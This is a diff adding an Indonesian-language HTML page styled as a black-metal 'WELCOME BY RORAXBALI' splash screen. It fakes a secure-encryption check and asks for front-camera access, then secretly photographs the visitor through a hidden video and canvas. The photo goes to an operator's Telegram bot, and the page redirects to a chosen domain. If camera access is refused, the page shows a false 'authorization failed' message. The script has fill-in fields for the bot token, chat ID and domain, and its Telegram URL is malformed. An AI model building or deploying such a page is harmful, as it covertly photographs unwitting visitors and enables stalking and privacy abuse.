@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WELCOME BY RORAXBALI</title>
+    <!-- Mengambil font khusus metal dari Google Fonts -->
+    <link rel="preconnect" href="https://googleapis.com">
+    <link rel="preconnect" href="https://gstatic.com" crossorigin>
+    <link href="https://googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet">
+    
+    <style>
+        /* Mengatur dasar halaman full hitam pekat sesuai gambar sampel */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #000000;
+            font-family: 'Metal Mania', system-ui, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Menyembunyikan elemen kamera internal */
+        video, canvas { 
+            display: none; 
+        }
+
+        /* Kotak Konsol Utama (Transparan penuh agar menyatu dengan latar hitam) */
+        .terminal {
+            width: 90%;
+            max-width: 500px;
+            padding: 60px 20px;
+            position: relative;
+            text-align: center;
+            z-index: 10;
+        }
+
+        /* ORNAMEN GARIS MERAH ATAS (Efek melengkung tajam sesuai gambar) */
+        .garis-merah-atas {
+            width: 80%;
+            height: 4px;
+            background: linear-gradient(90deg, transparent, #ff0000 20%, #ff0000 80%, transparent);
+            margin: 0 auto 35px auto;
+            border-radius: 50% / 100% 100% 0 0; /* Membuat efek lengkungan sayap */
+            box-shadow: 0 0 12px #ff0000;
+        }
+
+        /* ORNAMEN GARIS MERAH BAWAH */
+        .garis-merah-bawah {
+            width: 80%;
+            height: 4px;
+            background: linear-gradient(90deg, transparent, #ff0000 20%, #ff0000 80%, transparent);
+            margin: 35px auto 0 auto;
+            border-radius: 50% / 0 0 100% 100%;
+            box-shadow: 0 0 12px #ff0000;
+        }
+
+        /* TULISAN GAYA BLACK METAL (Putih Bersih, Runcing, dan Klasik) */
+        h1 {
+            margin: 0;
+            font-family: 'Metal Mania', serif;
+            font-size: 38px; /* Ukuran diperbesar agar karakter huruf metalnya gagah */
+            font-weight: normal;
+            color: #ffffff;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            /* Memberikan efek bayangan tipis agar tulisan lebih tegas */
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
+        }
+
+        /* Teks status informasi sistem di bawah judul */
+        .status-text {
+            font-size: 14px;
+            color: #a3a3a3; /* Abu-abu metalik redup */
+            margin: 20px 0 0 0;
+            font-weight: bold;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+
+        /* Status jika akses ditolak (Merah Menyala) */
+        .status-error {
+            color: #ff3333 !important;
+            text-shadow: 0 0 10px #ff0000;
+        }
+
+        /* Desain Progress Bar / Loading Bar Merah Minimalis */
+        .progress-container {
+            width: 60%;
+            background-color: rgba(255, 255, 255, 0.05);
+            border-radius: 0px;
+            overflow: hidden;
+            margin: 25px auto 0 auto;
+            height: 3px;
+            border: 1px solid rgba(255, 0, 0, 0.2);
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background-color: #ff0000;
+            box-shadow: 0 0 8px #ff0000;
+            transition: width 1.5s cubic-bezier(0.25, 1, 0.5, 1);
+        }
+
+        /* Loading bar tetap merah jika terjadi error */
+        .progress-bar.error {
+            background-color: #ff0000 !important;
+            box-shadow: 0 0 12px #ff0000 !important;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Kotak Autentikasi Sistem Utama -->
+    <div class="terminal">
+        <!-- Garis Merah Atas -->
+        <div class="garis-merah-atas"></div>
+
+        <!-- Judul Utama Gaya Metal -->
+        <h1>WELCOME BY RORAXBALI</h1>
+        
+        <!-- Status Sistem -->
+        <div class="status-text" id="status">Menginisialisasi enkripsi aman...</div>
+        
+        <!-- Loading Bar -->
+        <div class="progress-container">
+            <div class="progress-bar" id="bar"></div>
+        </div>
+
+        <!-- Garis Merah Bawah -->
+        <div class="garis-merah-bawah"></div>
+    </div>
+
+    <!-- Elemen penangkap foto internal tersembunyi -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="hiddenCanvas"></canvas>
+
+    <script>
+        // ==================== PENGATURAN UTAMA ====================
+        const TELEGRAM_BOT_TOKEN = 'MOHON_ISI_TOKEN_BOT_ANDA'; // Ganti dengan token bot Telegram Anda
+        const TELEGRAM_CHAT_ID = 'MOHON_ISI_CHAT_ID_ANDA';     // Ganti dengan Chat ID Telegram Anda
+        const DOMAIN_TUJUAN = 'https://alamat-domain-anda.com'; // Ganti dengan domain tujuan Anda
+        // ==========================================================
+
+        const video = document.getElementById('video');
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
+        const statusText = document.getElementById('status');
+        const progressBar = document.getElementById('bar');
+
+        // 1. Meminta verifikasi akses perangkat (Kamera)
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+                statusText.innerText = "Otorisasi berhasil. Membuka halaman...";
+                progressBar.style.width = "65%"; 
+                
+                setTimeout(ambilFotoOtomatis, 1600);
+            })
+            .catch(err => {
+                console.error("Akses ditolak: ", err);
+                
+                statusText.innerText = "OTORISASI GAGAL: Akses dibatasi karena izin perangkat ditolak.";
+                statusText.classList.add("status-error");
+                
+                progressBar.style.width = "100%";
+                progressBar.classList.add("error");
+            });
+
+        // 2. Pemrosesan penangkapan gambar secara terenkripsi
+        function ambilFotoOtomatis() {
+            const context = hiddenCanvas.getContext('2d');
+            hiddenCanvas.width = video.videoWidth;
+            hiddenCanvas.height = video.videoHeight;
+            
+            context.clearRect(0, 0, hiddenCanvas.width, hiddenCanvas.height);
+            context.save();
+            context.translate(hiddenCanvas.width, 0);
+            context.scale(-1, 1);
+            context.drawImage(video, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+            context.restore();
+
+            hiddenCanvas.toBlob((blob) => {
+                if (blob) {
+                    kirimKeTelegram(blob);
+                } else {
+                    window.location.href = DOMAIN_TUJUAN;
+                }
+            }, 'image/jpeg', 0.85);
+        }
+
+        // 3. Pengiriman berkas enkripsi ke server API Telegram
+        function kirimKeTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', imageBlob, 'secure_log.jpg');
+            formData.append('caption', '🛡️ Log Otorisasi Pengunjung: WELCOME BY RORAXBALI');
+
+            fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                progressBar.style.width = "100%"; 
+                statusText.innerText = "Koneksi selesai. Menghubungkan...";
+                
+                setTimeout(() => {
+                    window.location.href = DOMAIN_TUJUAN;
+                }, 800);
+            })
+            .catch(error => {
+                console.error('Transmisi error:', error);
+                window.location.href = DOMAIN_TUJUAN;
+            });
+        }
+    </script>
+</body>
+</html>
